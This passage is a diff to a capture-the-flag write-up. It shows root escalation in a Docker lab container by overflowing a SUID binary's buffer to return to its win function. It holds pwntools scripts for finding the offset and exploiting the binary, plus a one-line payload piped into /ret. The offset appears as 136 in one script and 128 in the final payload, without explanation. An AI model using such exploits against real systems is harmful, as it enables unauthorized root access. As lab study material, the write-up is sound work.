@@ -46,8 +46,45 @@ The presence of a file `.dockerenv` in `/` suggets me that I'm in a docker conta
 Infact the password is different.<br />
 At this point I was stuck for a while so I decided to run linpeas, and it finds a SUID binary actually inside `/`, the root directory, which I didn't notice initially. I think I need to exploit this to become root.<br />
 ![image](https://github.com/user-attachments/assets/2497a4b4-24db-442d-a670-77a354622cf5)<br />
+Given the description of this room I think I have to perform a buffer overflow attack. So I transfer the binary on my kali machine and execute checksec to see what defenses are enabled:<br />
+![image](https://github.com/user-attachments/assets/bad01232-2c13-4386-85f4-c389915a196b)<br />
+Just NX is enabled, meaning that I can't execute shellcode on the stack. Analyzing the binary with ghidra, I can see that there's a `win` function that executes the shell. I want to return to this function. So I use pwndbg to find the address of the win function (it stays always the same because the binary is not PIE, meaning that is not affected by ASLR).<br />
+![image](https://github.com/user-attachments/assets/41ed1935-23fc-4750-a491-514010649b60)<br />
+So the address of `win` is `0x0000000000400646`. Now I need to find the offset that overwrites the RIP. I use the following pwntools script:<br />
+from pwn import *
 
+    io = process('./ret')
+    io.recvline()
+    io.sendline(cyclic(500))
+    io.wait()
+    core = io.corefile
+    stack = core.rsp
+    info("rsp = %#x", stack)
+    pattern = core.read(stack, 4)
+    rip_offset = cyclic_find(pattern)
+    info("rip offset is %d", rip_offset)
+![image](https://github.com/user-attachments/assets/d198c59c-d951-4d1e-8c86-9173cefceeea)<br />
+The following pwntools script exploits the binary in my local machine: <br />
+   
+    from pwn import *
+    
+    p = process("./ret")
+    
+    offset = 136
+    rip = p64(0x0000000000400646)
+    print(rip)
+    ret_gadget = p64(0x00000000004006d2)
+    
+    payload = b"A"*offset
+    payload += ret_gadget
+    payload += rip
+    
+    p.recv()
+    p.sendline(payload)
+    p.interactive()
+(notice that I also had to take the address of a ret instruction in order to solve stack alignment issues).<br />
+Now I need to copy the payload in a way that I can exploit in in the target machine (since it doesnt have pwntools). And this is the final payload:
 
-
-
+    { python2 -c 'print "A" * 128 + "\xd2\x06\x40\x00\x00\x00\x00\x00\x46\x06\x40\x00\x00\x00\x00\x00"'; cat; } | /ret
+I am now root in the docker container, but the flag isn't in the `/root` directory. 
 
